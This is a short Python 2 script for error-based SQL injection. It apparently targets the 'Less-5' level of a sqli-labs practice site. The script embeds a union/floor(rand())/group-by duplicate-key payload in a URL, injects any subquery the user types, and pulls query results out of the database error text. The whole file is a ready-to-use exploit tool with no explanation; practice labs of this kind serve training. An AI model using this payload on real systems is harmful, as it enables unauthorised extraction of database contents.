#-*- coding: UTF-8 -*-
import requests
import string
import re


org_url = "http://mysqlilabs.com/Less-5/index.php?id=1'+union+select+1+from+(select+count(*),concat(floor(rand(0)*2),0x73747871,(%s),0x656e7178)a+from+information_schema.tables+group+by+a)b--+data"

if __name__ == "__main__":
	while True:
		query = raw_input("> ")
		query.replace(' ','+')
		url = org_url % query
		r = requests.get(url=url)
		# print r.content
		m = re.findall(r'stxq(.*)enqx',r.content)
		for result in m:
			print result






